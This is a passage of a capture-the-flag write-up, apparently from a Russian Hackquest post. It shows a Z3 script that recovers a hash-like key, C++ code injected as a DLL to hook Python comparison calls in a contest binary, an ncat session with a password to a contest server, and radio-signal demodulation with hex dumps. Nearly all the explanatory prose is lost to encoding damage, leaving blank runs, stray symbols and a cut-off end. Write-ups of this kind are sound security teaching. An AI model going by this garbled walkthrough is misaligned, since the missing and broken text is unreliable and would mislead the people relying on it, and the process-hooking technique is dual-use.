class="hljs-number">103</span></span>, <span class="hljs-number"><span class="hljs-number">87</span></span>, <span class="hljs-number"><span class="hljs-number">105</span></span>, <span class="hljs-number"><span class="hljs-number">102</span></span>, <span class="hljs-number"><span class="hljs-number">91</span></span>, <span class="hljs-number"><span class="hljs-number">95</span></span>] [<span class="hljs-number"><span class="hljs-number">121</span></span>, <span class="hljs-number"><span class="hljs-number">109</span></span>, <span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-number"><span class="hljs-number">126</span></span>, <span class="hljs-number"><span class="hljs-number">110</span></span>, <span class="hljs-number"><span class="hljs-number">102</span></span>, <span class="hljs-number"><span class="hljs-number">118</span></span>, <span class="hljs-number"><span class="hljs-number">90</span></span>, <span class="hljs-number"><span class="hljs-number">119</span></span>] [<span class="hljs-number"><span class="hljs-number">100</span></span>, <span class="hljs-number"><span class="hljs-number">101</span></span>, <span class="hljs-number"><span class="hljs-number">128</span></span>, <span class="hljs-number"><span class="hljs-number">82</span></span>, <span class="hljs-number"><span class="hljs-number">119</span></span>, <span class="hljs-number"><span class="hljs-number">118</span></span>, <span class="hljs-number"><span class="hljs-number">88</span></span>, <span class="hljs-number"><span class="hljs-number">134</span></span>, <span class="hljs-number"><span class="hljs-number">130</span></span>] [<span class="hljs-number"><span class="hljs-number">121</span></span>, <span class="hljs-number"><span class="hljs-number">127</span></span>, <span class="hljs-number"><span class="hljs-number">106</span></span>, <span class="hljs-number"><span class="hljs-number">122</span></span>, <span class="hljs-number"><span class="hljs-number">97</span></span>, <span class="hljs-number"><span class="hljs-number">112</span></span>, <span class="hljs-number"><span class="hljs-number">88</span></span>, <span class="hljs-number"><span class="hljs-number">119</span></span>] [<span class="hljs-number"><span class="hljs-number">103</span></span>, <span class="hljs-number"><span class="hljs-number">116</span></span>, <span class="hljs-number"><span class="hljs-number">92</span></span>, <span class="hljs-number"><span class="hljs-number">111</span></span>, <span class="hljs-number"><span class="hljs-number">112</span></span>, <span class="hljs-number"><span class="hljs-number">110</span></span>, <span class="hljs-number"><span class="hljs-number">88</span></span>] [<span class="hljs-number"><span class="hljs-number">128</span></span>, <span class="hljs-number"><span class="hljs-number">81</span></span>, <span class="hljs-number"><span class="hljs-number">80</span></span>, <span class="hljs-number"><span class="hljs-number">92</span></span>, <span class="hljs-number"><span class="hljs-number">90</span></span>, <span class="hljs-number"><span class="hljs-number">104</span></span>, <span class="hljs-number"><span class="hljs-number">91</span></span>, <span class="hljs-number"><span class="hljs-number">131</span></span>, <span class="hljs-number"><span class="hljs-number">95</span></span>] [<span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-number"><span class="hljs-number">127</span></span>, <span class="hljs-number"><span class="hljs-number">126</span></span>, <span class="hljs-number"><span class="hljs-number">93</span></span>, <span class="hljs-number"><span class="hljs-number">102</span></span>, <span class="hljs-number"><span class="hljs-number">104</span></span>, <span class="hljs-number"><span class="hljs-number">124</span></span>, <span class="hljs-number"><span class="hljs-number">98</span></span>] [<span class="hljs-number"><span class="hljs-number">117</span></span>, <span class="hljs-number"><span class="hljs-number">133</span></span>, <span class="hljs-number"><span class="hljs-number">100</span></span>, <span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-number"><span class="hljs-number">108</span></span>, <span class="hljs-number"><span class="hljs-number">142</span></span>, <span class="hljs-number"><span class="hljs-number">96</span></span>, <span class="hljs-number"><span class="hljs-number">119</span></span>] [<span class="hljs-number"><span class="hljs-number">117</span></span>, <span class="hljs-number"><span class="hljs-number">109</span></span>, <span class="hljs-number"><span class="hljs-number">133</span></span>, <span class="hljs-number"><span class="hljs-number">103</span></span>, <span class="hljs-number"><span class="hljs-number">93</span></span>, <span class="hljs-number"><span class="hljs-number">112</span></span>, <span class="hljs-number"><span class="hljs-number">110</span></span>, <span class="hljs-number"><span class="hljs-number">88</span></span>, <span class="hljs-number"><span class="hljs-number">134</span></span>] [<span class="hljs-number"><span class="hljs-number">75</span></span>, <span class="hljs-number"><span class="hljs-number">71</span></span>, <span class="hljs-number"><span class="hljs-number">101</span></span>, <span class="hljs-number"><span class="hljs-number">129</span></span>, <span class="hljs-number"><span class="hljs-number">116</span></span>, <span class="hljs-number"><span class="hljs-number">110</span></span>, <span class="hljs-number"><span class="hljs-number">102</span></span>, <span class="hljs-number"><span class="hljs-number">91</span></span>, <span class="hljs-number"><span class="hljs-number">130</span></span>] [<span class="hljs-number"><span class="hljs-number">98</span></span>, <span class="hljs-number"><span class="hljs-number">87</span></span>, <span class="hljs-number"><span class="hljs-number">94</span></span>, <span class="hljs-number"><span class="hljs-number">93</span></span>, <span class="hljs-number"><span class="hljs-number">148</span></span>, <span class="hljs-number"><span class="hljs-number">86</span></span>, <span class="hljs-number"><span class="hljs-number">149</span></span>] [<span class="hljs-number"><span class="hljs-number">100</span></span>, <span class="hljs-number"><span class="hljs-number">158</span></span>, <span class="hljs-number"><span class="hljs-number">103</span></span>, <span class="hljs-number"><span class="hljs-number">90</span></span>, <span class="hljs-number"><span class="hljs-number">88</span></span>, <span class="hljs-number"><span class="hljs-number">83</span></span>, <span class="hljs-number"><span class="hljs-number">95</span></span>] [<span class="hljs-number"><span class="hljs-number">87</span></span>, <span class="hljs-number"><span class="hljs-number">84</span></span>, <span class="hljs-number"><span class="hljs-number">86</span></span>, <span class="hljs-number"><span class="hljs-number">90</span></span>, <span class="hljs-number"><span class="hljs-number">88</span></span>, <span class="hljs-number"><span class="hljs-number">89</span></span>, <span class="hljs-number"><span class="hljs-number">145</span></span>] [<span class="hljs-number"><span class="hljs-number">100</span></span>, <span class="hljs-number"><span class="hljs-number">101</span></span>, <span class="hljs-number"><span class="hljs-number">103</span></span>, <span class="hljs-number"><span class="hljs-number">150</span></span>, <span class="hljs-number"><span class="hljs-number">93</span></span>, <span class="hljs-number"><span class="hljs-number">151</span></span>, <span class="hljs-number"><span class="hljs-number">89</span></span>, <span class="hljs-number"><span class="hljs-number">95</span></span>] [<span class="hljs-number"><span class="hljs-number">117</span></span>, <span class="hljs-number"><span class="hljs-number">108</span></span>, <span class="hljs-number"><span class="hljs-number">105</span></span>, <span class="hljs-number"><span class="hljs-number">166</span></span>, <span class="hljs-number"><span class="hljs-number">165</span></span>, <span class="hljs-number"><span class="hljs-number">111</span></span>, <span class="hljs-number"><span class="hljs-number">93</span></span>, <span class="hljs-number"><span class="hljs-number">96</span></span>] [<span class="hljs-number"><span class="hljs-number">117</span></span>, <span class="hljs-number"><span class="hljs-number">100</span></span>, <span class="hljs-number"><span class="hljs-number">107</span></span>, <span class="hljs-number"><span class="hljs-number">150</span></span>, <span class="hljs-number"><span class="hljs-number">114</span></span>, <span class="hljs-number"><span class="hljs-number">90</span></span>, <span class="hljs-number"><span class="hljs-number">110</span></span>, <span class="hljs-number"><span class="hljs-number">83</span></span>, <span class="hljs-number"><span class="hljs-number">149</span></span>] [<span class="hljs-number"><span class="hljs-number">117</span></span>, <span class="hljs-number"><span class="hljs-number">99</span></span>, <span class="hljs-number"><span class="hljs-number">116</span></span>, <span class="hljs-number"><span class="hljs-number">114</span></span>, <span class="hljs-number"><span class="hljs-number">112</span></span>, <span class="hljs-number"><span class="hljs-number">152</span></span>, <span class="hljs-number"><span class="hljs-number">88</span></span>, <span class="hljs-number"><span class="hljs-number">96</span></span>, <span class="hljs-number"><span class="hljs-number">154</span></span>] [<span class="hljs-number"><span class="hljs-number">108</span></span>, <span class="hljs-number"><span class="hljs-number">101</span></span>, <span class="hljs-number"><span class="hljs-number">103</span></span>, <span class="hljs-number"><span class="hljs-number">99</span></span>, <span class="hljs-number"><span class="hljs-number">153</span></span>, <span class="hljs-number"><span class="hljs-number">111</span></span>, <span class="hljs-number"><span class="hljs-number">102</span></span>, <span class="hljs-number"><span class="hljs-number">156</span></span>] [<span class="hljs-number"><span class="hljs-number">117</span></span>, <span class="hljs-number"><span class="hljs-number">176</span></span>, <span class="hljs-number"><span class="hljs-number">101</span></span>, <span class="hljs-number"><span class="hljs-number">99</span></span>, <span class="hljs-number"><span class="hljs-number">80</span></span>, <span class="hljs-number"><span class="hljs-number">122</span></span>, <span class="hljs-number"><span class="hljs-number">96</span></span>, <span class="hljs-number"><span class="hljs-number">167</span></span>] [<span class="hljs-number"><span class="hljs-number">77</span></span>, <span class="hljs-number"><span class="hljs-number">117</span></span>, <span class="hljs-number"><span class="hljs-number">140</span></span>, <span class="hljs-number"><span class="hljs-number">138</span></span>, <span class="hljs-number"><span class="hljs-number">102</span></span>, <span class="hljs-number"><span class="hljs-number">86</span></span>, <span class="hljs-number"><span class="hljs-number">118</span></span>] [<span class="hljs-number"><span class="hljs-number">101</span></span>, <span class="hljs-number"><span class="hljs-number">99</span></span>, <span class="hljs-number"><span class="hljs-number">158</span></span>, <span class="hljs-number"><span class="hljs-number">159</span></span>, <span class="hljs-number"><span class="hljs-number">104</span></span>, <span class="hljs-number"><span class="hljs-number">102</span></span>, <span class="hljs-number"><span class="hljs-number">90</span></span>, <span class="hljs-number"><span class="hljs-number">96</span></span>, <span class="hljs-number"><span class="hljs-number">95</span></span>] [<span class="hljs-number"><span class="hljs-number">109</span></span>, <span class="hljs-number"><span class="hljs-number">101</span></span>, <span class="hljs-number"><span class="hljs-number">115</span></span>, <span class="hljs-number"><span class="hljs-number">84</span></span>, <span class="hljs-number"><span class="hljs-number">111</span></span>, <span class="hljs-number"><span class="hljs-number">143</span></span>, <span class="hljs-number"><span class="hljs-number">90</span></span>] [<span class="hljs-number"><span class="hljs-number">107</span></span>, <span class="hljs-number"><span class="hljs-number">82</span></span>, <span class="hljs-number"><span class="hljs-number">168</span></span>, <span class="hljs-number"><span class="hljs-number">161</span></span>, <span class="hljs-number"><span class="hljs-number">102</span></span>, <span class="hljs-number"><span class="hljs-number">90</span></span>, <span class="hljs-number"><span class="hljs-number">96</span></span>, <span class="hljs-number"><span class="hljs-number">98</span></span>, <span class="hljs-number"><span class="hljs-number">95</span></span>] [<span class="hljs-number"><span class="hljs-number">71</span></span>, <span class="hljs-number"><span class="hljs-number">108</span></span>, <span class="hljs-number"><span class="hljs-number">158</span></span>, <span class="hljs-number"><span class="hljs-number">94</span></span>, <span class="hljs-number"><span class="hljs-number">85</span></span>, <span class="hljs-number"><span class="hljs-number">86</span></span>, <span class="hljs-number"><span class="hljs-number">162</span></span>, <span class="hljs-number"><span class="hljs-number">88</span></span>, <span class="hljs-number"><span class="hljs-number">106</span></span>] [<span class="hljs-number"><span class="hljs-number">75</span></span>, <span class="hljs-number"><span class="hljs-number">71</span></span>, <span class="hljs-number"><span class="hljs-number">80</span></span>, <span class="hljs-number"><span class="hljs-number">94</span></span>, <span class="hljs-number"><span class="hljs-number">92</span></span>, <span class="hljs-number"><span class="hljs-number">93</span></span>, <span class="hljs-number"><span class="hljs-number">148</span></span>, <span class="hljs-number"><span class="hljs-number">91</span></span>] [<span class="hljs-number"><span class="hljs-number">100</span></span>, <span class="hljs-number"><span class="hljs-number">99</span></span>, <span class="hljs-number"><span class="hljs-number">150</span></span>, <span class="hljs-number"><span class="hljs-number">93</span></span>, <span class="hljs-number"><span class="hljs-number">155</span></span>, <span class="hljs-number"><span class="hljs-number">83</span></span>, <span class="hljs-number"><span class="hljs-number">95</span></span>] [<span class="hljs-number"><span class="hljs-number">133</span></span>, <span class="hljs-number"><span class="hljs-number">109</span></span>, <span class="hljs-number"><span class="hljs-number">142</span></span>, <span class="hljs-number"><span class="hljs-number">87</span></span>, <span class="hljs-number"><span class="hljs-number">113</span></span>, <span class="hljs-number"><span class="hljs-number">94</span></span>, <span class="hljs-number"><span class="hljs-number">93</span></span>, <span class="hljs-number"><span class="hljs-number">85</span></span>, <span class="hljs-number"><span class="hljs-number">91</span></span>] [<span class="hljs-number"><span class="hljs-number">74</span></span>, <span class="hljs-number"><span class="hljs-number">135</span></span>, <span class="hljs-number"><span class="hljs-number">76</span></span>, <span class="hljs-number"><span class="hljs-number">80</span></span>, <span class="hljs-number"><span class="hljs-number">94</span></span>, <span class="hljs-number"><span class="hljs-number">92</span></span>, <span class="hljs-number"><span class="hljs-number">88</span></span>, <span class="hljs-number"><span class="hljs-number">149</span></span>]</code> </pre> <br><p>        ¬´     ¬ª,      3449,          . <br>    Z3 (SMT ). </p><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> z3 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * STUFF = [[<span class="hljs-number"><span class="hljs-number">100</span></span>, <span class="hljs-number"><span class="hljs-number">95</span></span>, <span class="hljs-number"><span class="hljs-number">98</span></span>, <span class="hljs-number"><span class="hljs-number">94</span></span>, <span class="hljs-number"><span class="hljs-number">102</span></span>, <span class="hljs-number"><span class="hljs-number">97</span></span>, <span class="hljs-number"><span class="hljs-number">103</span></span>], ‚Ä¶ [<span class="hljs-number"><span class="hljs-number">88</span></span>, <span class="hljs-number"><span class="hljs-number">74</span></span>, <span class="hljs-number"><span class="hljs-number">76</span></span>, <span class="hljs-number"><span class="hljs-number">92</span></span>, <span class="hljs-number"><span class="hljs-number">80</span></span>, <span class="hljs-number"><span class="hljs-number">149</span></span>, <span class="hljs-number"><span class="hljs-number">94</span></span>, <span class="hljs-number"><span class="hljs-number">135</span></span>]] s = Solver() chars = [] <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(len(STUFF)): chxr = Int(<span class="hljs-string"><span class="hljs-string">'c_%d'</span></span> % i) s.add(Or([chxr == STUFF[i][j] <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> j <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(len(STUFF[i]))])) chars += [chxr] s.add(Sum(*chars) == <span class="hljs-number"><span class="hljs-number">3449</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> s.check() == sat: mod = s.model() d = [mod[Int(<span class="hljs-string"><span class="hljs-string">'c_%d'</span></span> % i)] <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">32</span></span>)] print(d) s.add(Not(And([Int(str(xx)) == mod[xx] <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> xx <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> mod])) )</code> </pre> <br><p>  ,    18  . <br>             . <br> , , : </p><br><pre> <code class="hljs json">[<span class="hljs-number"><span class="hljs-number">100</span></span>, <span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-number"><span class="hljs-number">122</span></span>, <span class="hljs-number"><span class="hljs-number">125</span></span>, <span class="hljs-number"><span class="hljs-number">105</span></span>, <span class="hljs-number"><span class="hljs-number">126</span></span>, <span class="hljs-number"><span class="hljs-number">134</span></span>, <span class="hljs-number"><span class="hljs-number">127</span></span>, <span class="hljs-number"><span class="hljs-number">116</span></span>, <span class="hljs-number"><span class="hljs-number">131</span></span>, <span class="hljs-number"><span class="hljs-number">127</span></span>, <span class="hljs-number"><span class="hljs-number">117</span></span>, <span class="hljs-number"><span class="hljs-number">134</span></span>, <span class="hljs-number"><span class="hljs-number">116</span></span>, <span class="hljs-number"><span class="hljs-number">149</span></span>, <span class="hljs-number"><span class="hljs-number">103</span></span>, <span class="hljs-number"><span class="hljs-number">84</span></span>, <span class="hljs-number"><span class="hljs-number">89</span></span>, <span class="hljs-number"><span class="hljs-number">93</span></span>, <span class="hljs-number"><span class="hljs-number">83</span></span>, <span class="hljs-number"><span class="hljs-number">88</span></span>, <span class="hljs-number"><span class="hljs-number">99</span></span>, <span class="hljs-number"><span class="hljs-number">80</span></span>, <span class="hljs-number"><span class="hljs-number">77</span></span>, <span class="hljs-number"><span class="hljs-number">90</span></span>, <span class="hljs-number"><span class="hljs-number">143</span></span>, <span class="hljs-number"><span class="hljs-number">107</span></span>, <span class="hljs-number"><span class="hljs-number">71</span></span>, <span class="hljs-number"><span class="hljs-number">148</span></span>, <span class="hljs-number"><span class="hljs-number">83</span></span>, <span class="hljs-number"><span class="hljs-number">85</span></span>, <span class="hljs-number"><span class="hljs-number">74</span></span>]</code> </pre> <br><p>     ,   : </p><br><pre> <code class="hljs markdown">^[<span class="hljs-string"><span class="hljs-string">6789</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">89</span></span>][<span class="hljs-string"><span class="hljs-string">45</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">01</span></span>][<span class="hljs-string"><span class="hljs-string">89</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">89</span></span>][<span class="hljs-string"><span class="hljs-string">89</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">89</span></span>][<span class="hljs-string"><span class="hljs-string">0123</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">f</span></span>][<span class="hljs-string"><span class="hljs-string">01</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">23</span></span>][<span class="hljs-string"><span class="hljs-string">de</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">01</span></span>][<span class="hljs-string"><span class="hljs-string">de</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">a</span></span>][<span class="hljs-string"><span class="hljs-string">23</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">bc</span></span>][<span class="hljs-string"><span class="hljs-string">89</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">bc</span></span>][<span class="hljs-string"><span class="hljs-string">bc</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">bc</span></span>][<span class="hljs-string"><span class="hljs-string">89</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">bc</span></span>][<span class="hljs-string"><span class="hljs-string">bc</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">def</span></span>][<span class="hljs-string"><span class="hljs-string">a</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">89</span></span>][<span class="hljs-string"><span class="hljs-string">def</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">89</span></span>][<span class="hljs-string"><span class="hljs-string">bc</span></span>][<span class="hljs-symbol"><span class="hljs-symbol">45</span></span>]$</code> </pre> <br><p>  Examples: </p><br><pre> <code class="html hljs xml">684088880f02d0da2b8bbb8ccfa9e9c4 684088880f02d0da2b8bbb8ccfa9e9c5 684088880f02d0da2b8bbb8ccfa9f8b4 684088880f02d0da2b8bbb8ccfa9f8b5 684088880f02d0da2b8bbb8ccfa9f8c4 684088880f02d0da2b8bbb8ccfa9f8c5 684088880f02d0da2b8bbb8ccfa9f9b4</code> </pre> <br><p> :     ,     md5 . </p><br><h4 id="task-4-pythonre"> Task #4 pythonre </h4><br><p>      exe    Python. <br>  <code>pyc</code> . <br>   ,    <code>CreateProcessW</code> ,  <code>CreationFlags</code> , . <br><img src="https://habrastorage.org/getpro/habr/post_images/954/afc/30c/954afc30c3bd354e267c43de489ca2cb.png"></p><br><p>    ,       pyc   . <br><img src="https://habrastorage.org/getpro/habr/post_images/ece/8cb/c82/ece8cbc82077a9ebfa5222e7e1c1ca36.png"></p><br><p>   ,    ,  . <br>        . <br>  ( <code>dll</code> ),   <code>PyObject_RichCompare</code>      ( <code>stderr</code> )   . <br>  Code: </p><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">typedef</span></span> <span class="hljs-keyword"><span class="hljs-keyword">void</span></span> PyObject; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">typedef</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">void</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(CDECL * _PyObject_Dump)</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(PyObject *o1)</span></span></span></span>; _PyObject_Dump PyObject_Dump; PHOOK hook1; <span class="hljs-function"><span class="hljs-function">PyObject* CDECL </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">xPyObject_RichCompare</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(PyObject *o1, PyObject *o2, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> opid)</span></span></span><span class="hljs-function"> </span></span>{ PyObject* result = ((PyObject*(CDECL*)(PyObject*,PyObject*,<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>))hook1-&gt;original)(o1, o2, opid); PyObject_Dump(o1); PyObject_Dump(o2); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> result; } <span class="hljs-keyword"><span class="hljs-keyword">typedef</span></span> PyObject*(CDECL * PyObject_RichCompare)(PyObject *o1, PyObject *o2, <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> opid); <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">hackFunctions</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ PyObject_Dump = (_PyObject_Dump)GetProcAddress(GetModuleHandleA(<span class="hljs-string"><span class="hljs-string">"python27.dll"</span></span>), <span class="hljs-string"><span class="hljs-string">"_PyObject_Dump"</span></span>); hook1 = HookFunction(GetProcAddress(GetModuleHandleA(<span class="hljs-string"><span class="hljs-string">"python27.dll"</span></span>), <span class="hljs-string"><span class="hljs-string">"PyObject_RichCompare"</span></span>), xPyObject_RichCompare); } <span class="hljs-function"><span class="hljs-function">BOOL APIENTRY </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">DllMain</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(HMODULE hModule, DWORD reason, LPVOID lpReserved)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">switch</span></span> (reason) { <span class="hljs-keyword"><span class="hljs-keyword">case</span></span> DLL_PROCESS_ATTACH: hackFunctions(); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> TRUE; }</code> </pre> <br><p>     <code>re_task.exe</code>       . <br><img src="https://habrastorage.org/getpro/habr/post_images/469/7e4/dd4/4697e4dd4da711db2881644ec3fa926f.png"></p><br><p>       (     <code>data.txt</code> ,     ). </p><br><p>        ,   <code>re.sub</code>    <code>None</code> . </p><br><p>     -  ( <a href="http://irq5.io/2016/08/17/labyrenth-2016-write-up-regex/">LabyREnth 2016</a> ),                .          <a href="https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/reversing/re-gex">-   PlaidCTF 2015</a> . </p><br><p>    ,      . </p><br><p>     . </p><br><p> <code>nooyhtortroornehopetrotnnrenohtopyeohnoeyonyrherpo teptooeonoohptppeoprtphprthrhpnnyyprrpnhepoportppr enppeoernnehtynrotyynerttoyeeteepepohhoyrptnhponro tpehooeonptnophoyphnp</code> </p> <br><p><img src="https://habrastorage.org/getpro/habr/post_images/70b/dc4/be1/70bdc4be18c8579a7e8463453c82ad59.png"></p><br><p>      ( <code>task2.py</code> , <code>task2_packer.py</code> , <code>re_task.pyc</code> ) <a href="https://forum.reverse4you.org/attachment.php%3Fattachmentid%3D261%26d%3D1509328440">ZN2017.7z‚Äé</a> . </p></div></div><br><hr><br><h1> Day 5. NotSafeAgency </h1><br><p>       Hackquest'   Digital Security          .  100          . </p><br><table><tbody><tr><td colspan="2" align="center">  Winners </td></tr><tr><td align="center"> <b>1 </b> </td><td align="center"> <b>2 </b> </td></tr><tr><td align="center"><pre> <code class="html hljs xml">maximilian</code> </pre> </td><td align="center"><pre> <code class="html hljs xml">p41l</code> </pre> </td></tr></tbody></table><br><div class="spoiler"> <b class="spoiler_title">5th day writeup. (by DSec)</b> <div class="spoiler_text"><blockquote> Yo dude! Our insider in NSA had set up some strange BUG in the printer. Nobody has seen him since then. His last message was: "They are communicating via strange devices on 2.4". We tried to understand, but failed horrobly. Now it is your turn to figure out what is going on. <br> The insider gave us access to the BUG: 35.195.97.218:31337 with password "antiNSAradiospy" </blockquote><p>        Universal Radio Hacker <a href="https://github.com/jopohl/urh">(URH)</a> .     . </p><br><p>       : </p><br><pre> <code class="html hljs xml">ncat 35.195.97.218 31337 Hey you're entering into secure zone. Enter Password:</code> </pre> <br><p>       : </p><br><pre> <code class="html hljs xml">Hello! This is NSA_sup3r_r4d1o_h4ck1ng_spy_d3v1c3. Select frequency. Available frequencies (MHz) is: 2401, 2402, 2403, 2404, 2405, 2406, 2407, 2408, 2409, 2410</code> </pre> <br><p>       ""    ,       .        2401  : </p><br><pre> <code class="html hljs xml">ncat 35.195.97.218 31337 &gt; 2401_rawdump antiNSAradiospy 2401</code> </pre> <br><p>           <code>2401_rawdump</code> : </p><br><pre> <code class="html hljs xml">18M Nov 2 13:14 2401_rawdump 19M Nov 2 13:14 2401_rawdump 20M Nov 2 13:14 2401_rawdump 21M Nov 2 13:14 2401_rawdump 22M Nov 2 13:14 2401_rawdump 24M Nov 2 13:14 2401_rawdump 27M Nov 2 13:14 2401_rawdump 30M Nov 2 13:14 2401_rawdump</code> </pre> <br><p>  30      ,     . </p><br><h3 id="rabota-s-dampom">    </h3><br><p>   ,        ,    -   <code>SDR</code> .  ,    . </p><br><p>         <code>SDR</code>  ,    <code>IQ</code> . </p><br><p> ,     -  .  hex    </p><br><p><img src="https://habrastorage.org/webt/ix/oy/p6/ixoyp6srtctjl7jenyyy5d0kcom.png"></p><br><p>   <br><img src="https://habrastorage.org/webt/t_/1n/cy/t_1ncyje_ys4rhaquwqjeuqxhoy.png"></p><br><p>      URH </p><br><p><img src="https://habrastorage.org/webt/pd/qz/la/pdqzlaipav9mcln8wxvktfxt3z8.png"></p><br><p> ,    .           ‚Äî  <code>Noize</code> . </p><br><p>  Noze  <code>0.5500</code> ,       : </p><br><p><img src="https://habrastorage.org/webt/r9/an/yn/r9anynuwk0cstdfkq7ui7cls94e.png"></p><br><p>        .       ,             URH.    8 .  <code>Bit Length</code>  <code>8</code> . </p><br><p><img src="https://habrastorage.org/webt/bf/8s/he/bf8shekw4wuosgvustwdbzjrslq.png"></p><br><p>       ( <code>Signal View -&gt; Demodulated</code> ). <br>   <code>Center</code>  ,   ,   ,      . </p><br><p><img src="https://habrastorage.org/webt/nf/qf/ra/nfqfrayclo82mbh9jpmi0b_rxxy.png"></p><br><p>  <code>Show Signal as</code>  <code>Hex</code>      : </p><br><pre> <code class="hljs dos"><span class="hljs-number"><span class="hljs-number">3</span></span>c6aaccaaccaaccce2a3434b99034b9903434b73a1031b430b73732b610938000000000000000002c93bc2 [<span class="hljs-built_in"><span class="hljs-built_in">Pause</span></span>: <span class="hljs-number"><span class="hljs-number">1571</span></span> samples] <span class="hljs-number"><span class="hljs-number">3</span></span>c055665566556667951a1a5cc81a5cc81d195cdd081b595cdcd859d94b8b89c000000000000000151df85 [<span class="hljs-built_in"><span class="hljs-built_in">Pause</span></span>: <span class="hljs-number"><span class="hljs-number">1183</span></span> samples] f82ab32ab32ab333ca8d0d2e640d2e640e8cae6e840dacae6e6c2ceca5c5c4e0000000000000000a8efc28 [<span class="hljs-built_in"><span class="hljs-built_in">Pause</span></span>: <span class="hljs-number"><span class="hljs-number">1166</span></span> samples] <span class="hljs-number"><span class="hljs-number">3</span></span>c655665566556667951a1a5cc81a5cc81d195cdd081b595cdcd859d94b8b89c000000000000000151df85 [<span class="hljs-built_in"><span class="hljs-built_in">Pause</span></span>: <span class="hljs-number"><span class="hljs-number">1564</span></span> samples] <span class="hljs-number"><span class="hljs-number">3</span></span>c555995599559998546869732069732074657374206d6573736167652e2e000000000000000000544ebd4 [<span class="hljs-built_in"><span class="hljs-built_in">Pause</span></span>: <span class="hljs-number"><span class="hljs-number">1167</span></span> samples] <span class="hljs-number"><span class="hljs-number">3</span></span>e0aaccaaccaacccc2a3434b99034b9903a32b9ba1036b2b9b9b0b3b297170000000000000000002a275ea [<span class="hljs-built_in"><span class="hljs-built_in">Pause</span></span>: <span class="hljs-number"><span class="hljs-number">1167</span></span> samples] <span class="hljs-number"><span class="hljs-number">3</span></span>c655665566556666151a1a5cc81a5cc81d195cdd081b595cdcd859d94b8b8000000000000000001513af5 [<span class="hljs-built_in"><span class="hljs-built_in">Pause</span></span>: <span class="hljs-number"><span class="hljs-number">203907</span></span> samples] <span class="hljs-number"><span class="hljs-number">3</span></span>c355665566556666949a59da1d081dd85e4848151c9e481a0d1c990cdc88484840000000000000150453d [<span class="hljs-built_in"><span class="hljs-built_in">Pause</span></span>: <span class="hljs-number"><span class="hljs-number">1167</span></span> samples] <span class="hljs-number"><span class="hljs-number">3</span></span>c2aaccaaccaacccd2934b3b43a103bb0bc90902a393c90341a393219b9109090800000000000002a08a7a [<span class="hljs-built_in"><span class="hljs-built_in">Pause</span></span>: <span class="hljs-number"><span class="hljs-number">1166</span></span> samples] <span class="hljs-number"><span class="hljs-number">3</span></span>c2aaccaaccaacccd2934b3b43a103bb0bc90902a393c90341a393219b9109090800000000000002a08a7a [<span class="hljs-built_in"><span class="hljs-built_in">Pause</span></span>: <span class="hljs-number"><span class="hljs-number">1565</span></span> samples] <span class="hljs-number"><span class="hljs-number">3</span></span>c35566556655666710da1958dac8185b9bdd1a195c8818da185b9b995b1cc840000000000000001492655 [<span class="hljs-built_in"><span class="hljs-built_in">Pause</span></span>: <span class="hljs-number"><span class="hljs-number">1167</span></span> samples] <span class="hljs-number"><span class="hljs-number">3</span></span>c45566556655666710da1958dac8185b9bdd1a195c8818da185b9b995b1cc840000000000000001492654 [<span class="hljs-built_in"><span class="hljs-built_in">Pause</span></span>: <span class="hljs-number"><span class="hljs-number">1166</span></span> samples] <span class="hljs-number"><span 